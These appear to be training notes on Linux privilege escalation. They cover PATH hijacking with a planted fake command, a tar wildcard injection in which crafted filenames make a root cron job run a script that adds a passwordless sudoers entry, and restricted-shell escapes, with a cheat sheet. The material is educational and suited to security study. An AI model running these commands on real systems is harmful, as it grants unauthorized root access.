## 1. What "Environment-Based" Means Here

This category of privilege escalation doesn't rely on a software bug or a missing patch — it relies on how the shell environment itself is configured: which folders it trusts for commands, how it interprets special characters, and how tightly (or loosely) it restricts what a user can type. Three related techniques fall under this umbrella: abusing the `PATH` variable, abusing wildcard characters passed into certain commands, and escaping out of deliberately restricted shells.

---

## 2. PATH Abuse

### 2.1 What PATH Actually Does

**`PATH`** is an environment variable holding a list of folders the shell automatically searches, in order, whenever a command is typed without a full file path. This is why typing `cat /tmp/test.txt` works instead of having to type the full `/bin/cat /tmp/test.txt` every time — the shell checks each folder listed in `PATH` until it finds something named `cat`.

```bash
$ echo $PATH

/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
```

(`env | grep PATH` is an equivalent way to check this.)

Think of `PATH` like a list of pantries a chef checks, in a fixed order, any time a recipe calls for "salt" by name rather than by exact brand and shelf location. Whichever pantry is checked *first* and happens to contain something labeled "salt" is the one that gets used — which matters a lot if someone sneaks a lookalike container into an earlier pantry on the list.

### 2.2 Proving a PATH Directory Follows You Anywhere

Any script or program placed inside one of the folders listed in `PATH` becomes runnable from *any* directory on the system, just by typing its name — no need to specify where it actually lives.

```bash
$ pwd && conncheck 

/usr/local/sbin
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      1189/sshd       
tcp        0     88 10.129.2.12:22          10.10.14.3:43218        ESTABLISHED 1614/sshd: mickey [priv]
tcp6       0      0 :::22                   :::*                    LISTEN      1189/sshd       
tcp6       0      0 :::80                   :::*                    LISTEN      1304/apache2
```

- `conncheck` here is a custom script that was placed inside `/usr/local/sbin` (which is one of the folders listed in `PATH`), so running it from inside that same folder works exactly like running any built-in command — the output shown looks like a `netstat`-style active-connections listing.

```bash
$ pwd && conncheck 

/tmp
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      1189/sshd       
tcp        0    268 10.129.2.12:22          10.10.14.3:43218        ESTABLISHED 1614/sshd: mickey [priv]
tcp6       0      0 :::22                   :::*                    LISTEN      1189/sshd       
tcp6       0      0 :::80                   :::*                    LISTEN      1304/apache2
```

- The point of this second run: even from `/tmp` — a completely different directory — typing `conncheck` still works. The shell didn't need to be told where the script lives, because it already knew to check `/usr/local/sbin` as part of its standard `PATH` search.

### 2.3 The Dangerous Trick: Adding `.` to PATH

The character `.` represents "the current working directory" (wherever you happen to be standing in the filesystem right now). Adding `.` to the front of `PATH` tells the shell: *also check my current folder, and check it first.*

```bash
$ echo $PATH

/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
```

```bash
$ PATH=.:${PATH}
$ export PATH
$ echo $PATH

.:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
```

- `PATH=.:${PATH}` rebuilds the `PATH` variable with `.` stuck on at the very front, followed by everything that was already there.
- `export PATH` makes that change take effect for the current shell session (and anything launched from it).

This is dangerous because it means a program sitting in your current folder with the *same name* as a common command will now run **instead of** the real one, simply because `.` is checked first.

```bash
$ touch ls
$ echo 'echo "PATH ABUSE!!"' > ls
$ chmod +x ls
```

- `touch ls` creates an empty file named `ls`.
- `echo 'echo "PATH ABUSE!!"' > ls` writes a one-line script into that file — a script that, if run, just prints `PATH ABUSE!!`.
- `chmod +x ls` marks it as executable.

```bash
$ ls

PATH ABUSE!!
```

- Typing `ls` now runs the fake script instead of the real `ls` binary at `/bin/ls`, because the current directory (`.`) is checked before anywhere else in `PATH`.

The real-world abuse case: if an attacker can get a privileged user (or an automated script running as root) to have `.` in their `PATH`, the attacker can plant a malicious file named after a common command — such as a reverse shell disguised as `ls` — in a folder that privileged user is likely to run commands from. The next time that command name is typed, the attacker's code runs instead, inheriting whatever privilege level that user had.

## 3. Wildcard Abuse

### 3.1 What Wildcards Are

A **wildcard** is a special character the shell expands or interprets *before* running a command — meaning the shell substitutes something else in its place ahead of time, rather than passing the literal character straight to the program.

| Character | Significance |
|---|---|
| `*` | Matches any number of characters in a filename |
| `?` | Matches exactly one character |
| `[ ]` | Matches any single character from the set enclosed in the brackets |
| `~` | Expands to the current user's home directory (or another user's, if a username follows it) |
| `-` (inside brackets) | Denotes a range of characters |

### 3.2 Abusing `tar`'s Checkpoint Feature

`tar` is the standard Linux tool for creating and extracting archive files. Checking its manual page reveals a feature that becomes dangerous the moment `tar` is run with a wildcard:

```bash
$ man tar

<SNIP>
Informative output
       --checkpoint[=N]
              Display progress messages every Nth record (default 10).

       --checkpoint-action=ACTION
              Run ACTION on each checkpoint.
```

- `--checkpoint-action` lets `tar` run an arbitrary action — including an `exec` action, meaning it can **run any operating system command** — every time it hits a "checkpoint" during the archiving process.
- The trick: these options don't have to be typed on the command line by a human. If `tar *` is run (using a wildcard to mean "everything in this folder"), and a file happens to exist whose *name* literally matches `--checkpoint-action=exec=sh root.sh`, the shell expands the wildcard to include that filename — and `tar` interprets it as a real command-line option rather than just a filename to archive.

### 3.3 Walking Through the Attack

Picture a cron job (an automated, scheduled task — see the earlier internals-enumeration notes) set up to back up a user's home directory every minute:

```
# m h dom mon dow command
*/01 * * * * cd /home/john && tar -zcf /home/john/backup.tar.gz *
```

Because this job uses `tar -zcf ... *` — a bare wildcard, with no specific filenames — and runs automatically every minute, it's an ideal target: any file an attacker plants in that folder, with the right name, gets picked up and treated as a `tar` argument the next time the job fires.

```bash
$ echo 'echo "john ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
$ echo "" > "--checkpoint-action=exec=sh root.sh"
$ echo "" > --checkpoint=1
```

- `root.sh` is a script that, when run, appends a line to `/etc/sudoers` granting the `john` user the ability to run *any* command as root, with no password required.
- The second and third lines create two **empty files** whose names *are themselves* the `tar` options needed to trigger the exploit: `--checkpoint=1` (checkpoint after every single record) and `--checkpoint-action=exec=sh root.sh` (on that checkpoint, run `sh root.sh`).

```bash
$ ls -la

total 56
drwxrwxrwt 10 root        root        4096 Aug 31 23:12 .
drwxr-xr-x 24 root        root        4096 Aug 31 02:24 ..
-rw-r--r--  1 root        root         378 Aug 31 23:12 backup.tar.gz
-rw-rw-r--  1 john john    1 Aug 31 23:11 --checkpoint=1
-rw-rw-r--  1 john john    1 Aug 31 23:11 --checkpoint-action=exec=sh root.sh
drwxrwxrwt  2 root        root        4096 Aug 31 22:36 .font-unix
drwxrwxrwt  2 root        root        4096 Aug 31 22:36 .ICE-unix
-rw-rw-r--  1 john john   60 Aug 31 23:11 root.sh
```

- This confirms all three files exist in the target folder, owned by the low-privileged user, ready to be picked up the next time the wildcard-driven cron job runs.

```bash
john@NIX02:~$ sudo -l

Matching Defaults entries for john on NIX02:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User john may run the following commands on NIX02:
    (root) NOPASSWD: ALL
```

- Once the cron job fires again (within a minute, given the schedule), it runs `tar -zcf backup.tar.gz *` — the wildcard expands to include the two specially-named files, `tar` interprets them as the checkpoint options rather than filenames, and `root.sh` executes as part of that root-owned cron job. The result: `john` can now run absolutely anything via `sudo`, with no password, confirmed by the `sudo -l` output above.

## 4. Escaping Restricted Shells

### 4.1 What a Restricted Shell Is

A **restricted shell** deliberately limits what a logged-in user is allowed to do — often locking them to a specific, small set of approved commands, or blocking them from leaving a specific directory entirely. Administrators use restricted shells to give certain users (contractors, external partners, limited-purpose service accounts) just enough access to do their job without exposing the rest of the system.

Think of it like a hotel keycard that only opens the gym and the lobby — it's still a working key, but its reach has been deliberately narrowed.

### 4.2 The Three Common Restricted Shells

| Shell | Full Name | What It Restricts |
|---|---|---|
| **rbash** | Restricted Bourne shell | Changing directories, setting/modifying environment variables, running commands outside allowed directories |
| **rksh** | Restricted Korn shell | Running commands in other directories, creating/modifying shell functions, modifying the shell environment |
| **rzsh** | Restricted Z shell | Running shell scripts, defining aliases, modifying the shell environment |

A typical enterprise setup might assign each kind of user a different one of these based on how much flexibility they actually need: external partners with only `rbash` access to email and file sharing, contractors needing broader access to things like database or web servers given `rksh`, and employees running specific internal scripts or applications given `rzsh` — each tier more flexible than the last, but still boxed in.

Several general techniques exist for breaking out of these restrictions — some lean on quirks in the restricted shell itself, others rely on creative ways of slipping a disallowed command past the filter.

### 4.3 Escape Technique: Command Injection

If a restricted shell allows running one specific command with arguments (say, only `ls` with flags like `-l` or `-a`), it may still be possible to smuggle a *different* command in as part of that argument.

```bash
$ ls -l `pwd`
```

- The backticks around `pwd` tell the shell to run `pwd` first and substitute its output directly into the `ls -l` command line. Since `pwd` itself was never directly permitted or denied by the restricted shell, this can let a disallowed command's output slip through disguised as "just an argument" to an allowed one.

### 4.4 Escape Technique: Command Substitution

Closely related to the above: many shells support syntax (like backticks, or `$(...)`) specifically meant to run a command and substitute its result inline. If the restricted shell checks only the command being run directly, but not commands hidden inside this kind of substitution syntax, a disallowed command executed this way can slip through the same gap.

### 4.5 Escape Technique: Command Chaining

Shells generally let you type more than one command on a single line, separated by a special character — a semicolon (`;`) to run commands one after another, or a pipe (`|`) to feed one command's output into another. If the restricted shell only inspects the *first* command on the line and doesn't properly re-check everything following a chaining character, a disallowed command tacked on after a `;` or `|` may run freely.

### 4.6 Escape Technique: Environment Variables

If the restricted shell relies on an environment variable to decide something important — such as which directory commands are allowed to run in — then being able to modify that variable's value can let you redirect the shell's own logic. In effect, you're not breaking a rule directly; you're changing the definition the shell is using to decide what the rule even means.

### 4.7 Escape Technique: Shell Functions

If the restricted shell permits users to define and call their own shell functions (small named blocks of commands), it may be possible to wrap a disallowed command inside a function definition. Since the restriction might only be checking for a *command name* being typed directly, rather than inspecting what's actually written inside a function body, calling that function can run the hidden command.

## 6. Cheat Sheet

| Goal | Command / Technique |
|---|---|
| Check current PATH | `echo $PATH` or `env \| grep PATH` |
| Add current directory to PATH (risky — for understanding the attack) | `PATH=.:${PATH}` then `export PATH` |
| Plant a fake command in current directory | `touch <name>; echo '<payload>' > <name>; chmod +x <name>` |
| View tar's checkpoint options | `man tar` |
| Build the two "magic filename" files for the tar wildcard trick | `echo "" > "--checkpoint-action=exec=sh root.sh"` and `echo "" > --checkpoint=1` |
| Check for newly granted sudo rights after a cron-based exploit lands | `sudo -l` |
| Escape via command injection | `ls -l \`pwd\`` (or similar backtick/argument trick) |
| Escape via command substitution | `` `command` `` or `$(command)` |
| Escape via command chaining | `allowed_cmd ; disallowed_cmd` or `allowed_cmd \| disallowed_cmd` |
| Escape via environment variables | Modify the variable the restricted shell relies on for its restrictions |
| Escape via shell functions | Define a function wrapping the disallowed command, then call the function name |

## 7. Big-Picture Takeaways

1. **PATH is a trust list, and trust lists can be poisoned.** Anything placed inside a folder listed in `PATH` becomes runnable from anywhere — and adding `.` to the front of that list means "trust whatever is sitting in my current folder first," which is exactly the gap that lets a disguised file silently replace a real command.
2. **Wildcards are expanded by the shell before the target program ever sees them.** A command like `tar *` doesn't know the difference between a genuine filename and a cleverly named file designed to be read as a command-line flag — which is exactly how `--checkpoint-action=exec=...` turns an ordinary backup job into arbitrary code execution.
3. **Automated, scheduled, wildcard-driven commands running as root are high-value targets.** A cron job is especially dangerous when it combines three things: it runs as a privileged user, it runs on a predictable schedule, and it processes files using a bare wildcard in a folder a lower-privileged user can write to.
4. **Restricted shells are a policy, not a hard technical wall.** Each restriction (blocked directories, blocked commands, blocked variable changes) only holds if the shell is actually checking for every way a disallowed action could sneak through — injection, substitution, chaining, environment tweaks, and functions are all different doors into the same room.
5. **The common thread across all three techniques is indirection.** PATH abuse hides a malicious file behind a trusted-sounding name; wildcard abuse hides a command behind a filename; shell escapes hide a disallowed command behind something the restriction wasn't designed to inspect. Spotting "something is being interpreted differently than it looks" is the core skill in all three.
6. **Confirm success concretely, not just by assumption.** In the wildcard example, the attack isn't considered successful until `sudo -l` actually shows the new `NOPASSWD: ALL` entry — always verify a technique actually landed rather than assuming it worked.
